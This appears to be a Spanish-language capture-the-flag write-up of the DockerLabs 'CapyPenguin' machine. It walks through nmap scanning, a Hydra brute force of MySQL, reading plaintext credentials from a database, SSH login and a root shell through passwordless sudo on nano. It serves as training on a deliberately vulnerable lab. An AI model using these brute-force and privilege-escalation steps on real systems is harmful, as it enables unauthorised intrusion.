---
title: CapyPenguin Writeup - DockerLabs
date: 2024-08-09
categories: [WriteUps, DockerLabs]
tags: [Linux, Easy, DockerLabs]
img_path: /assets/img/dck/capy_penguin/
image: /assets/img/dck/capy_penguin/capy_penguin.png
---

Explotamos una vulnerabilidad en el servicio MySQL para obtener credenciales de acceso. Con estas credenciales, accedimos a la base de datos y obtuvimos información de usuario, que usamos para iniciar sesión en el sistema a través de SSH. Finalmente, aprovechamos un comando con privilegios elevados en `nano` para ejecutar una shell de root y obtener control total de la máquina.

## Reconocimiento
---
Realizamos un escaneo de puertos en la máquina objetivo utilizando `nmap` para identificar los servicios en ejecución.

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
_______________________________________________________________________
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
```

---
Los puertos identificados son **22 (SSH)**, **80 (HTTP)** y **3306 (MySQL)**. A continuación, realizamos un escaneo más detallado en estos puertos para obtener información adicional sobre los servicios y sus versiones.

```bash
nmap -sCV -p22,80,3306 172.17.0.2 -oN targeted 
_______________________________________________________________________
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9e:6a:3f:89:de:9d:05:d9:94:32:73:8d:31:e0:a5:eb (ECDSA)
|_  256 e7:ef:4f:4a:25:86:c9:55:b0:88:0a:8c:79:03:d0:9f (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Web de Capybaras
|_http-server-header: Apache/2.4.52 (Ubuntu)
3306/tcp open  mysql   MySQL 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
|   Thread ID: 35
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSigpipes, FoundRows, SupportsTransactions, LongColumnFlag, IgnoreSpaceBeforeParenthesis, ODBCClient, ConnectWithDatabase, SupportsLoadDataLocal, SupportsCompression, InteractiveClient, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: Hmof0ZTw|*X^NLqtr_fd
|_  Auth Plugin Name: mysql_native_password
```
## Enumeración
---
Dado que el puerto 80 está abierto y ejecutando un servidor HTTP, exploramos la página web en busca de información útil o posibles puntos de entrada.

![capy_penguin-1](/assets/img/dck/capy_penguin/capy_penguin-1.png)

---
Exploramos la página web y encontramos referencias a un usuario potencialmente válido, **capybarauser**. Además, se menciona que la contraseña está en las últimas palabras del diccionario **rockyou.txt**. Para facilitar la búsqueda, invertimos el contenido del archivo usando `tac`.

```bash
tac /usr/share/wordlists/rockyou.txt > RockyouInvertido.txt
```
## Explotación
---
Con la información recopilada, realizamos un ataque de fuerza bruta al servicio MySQL utilizando `Hydra`, intentando acceder con el usuario **capybarauser** y el diccionario invertido.

```bash
hydra -l capybarauser -P RockyouInvertido.txt mysql://172.17.0.2 -t 4
_______________________________________________________________________
[DATA] attacking mysql://172.17.0.2:3306/
[3306][mysql] host: 172.17.0.2   login: capybarauser   password: ie168
1 of 1 target successfully completed, 1 valid password found
```
---
El ataque fue exitoso, y encontramos las credenciales. Ahora nos conectamos a la base de datos MySQL utilizando las credenciales obtenidas.

```bash
mysql -h 172.17.0.2 -u capybarauser -pie168
_______________________________________________________________________
MariaDB [(none)]> 
```
---
Una vez dentro de MySQL, comenzamos la enumeración de las bases de datos disponibles.

```sql
MariaDB [(none)]> SHOW DATABASES;
_______________________________________________________________________
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| pinguinasio_db     |
| sys                |
+--------------------+
5 rows in set (0.003 sec)
```
---
Encontramos la base de datos **pinguinasio_db**, y dentro de ella, identificamos la tabla **users**.

```sql
MariaDB [(none)]> USE pinguinasio_db;
--------------------------------------------------
MariaDB [pinguinasio_db]> SHOW TABLES;
_______________________________________________________________________
+--------------------------+
| Tables_in_pinguinasio_db |
+--------------------------+
| users                    |
+--------------------------+
1 row in set (0.000 sec)
```
---
Exploramos el contenido de la tabla **users** para obtener más información.

```sql
MariaDB [pinguinasio_db]> SELECT * FROM users;
_______________________________________________________________________
+----+-------+------------------+
| id | user  | password         |
+----+-------+------------------+
|  1 | mario | pinguinomolon123 |
+----+-------+------------------+
1 row in set (0.000 sec)
```
---
Encontramos a un usuario llamado **mario** con la contraseña **pinguinomolon123**. Con las credenciales obtenidas, intentamos conectarnos al servidor mediante SSH.

```bash
ssh mario@172.17.0.2
mario@172.17.0.2's password: pinguinomolon123
_______________________________________________________________________
mario@54bec2b5e6ff:~$ 
```
---
Logramos acceder a la máquina objetivo. Ahora, preparamos la TTY para trabajar cómodamente en la consola.

```bash
script /dev/null -c bash
# Presionamos "Control + Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 41 columns 183
```
## Escalada de Privilegios
---
Para la escalada de privilegios, listamos los comandos que el usuario puede ejecutar con privilegios elevados.

```bash
mario@54bec2b5e6ff:~$ sudo -l
_______________________________________________________________________
    (ALL : ALL) NOPASSWD: /usr/bin/nano
```
---
Vemos que podemos ejecutar **nano** como root sin proporcionar contraseña. Utilizamos [GTFObins](https://gtfobins.github.io/) para determinar el procedimiento a seguir.

```bash
sudo nano
# Adentro de Nano presionamos Ctrl+R y luego Ctrl+X
reset; bash 1>&0 2>&0
```

Logramos obtener una shell como root en la máquina objetivo.
```bash
root@54bec2b5e6ff:/home/mario# whoami
_______________________________________________________________________
root
```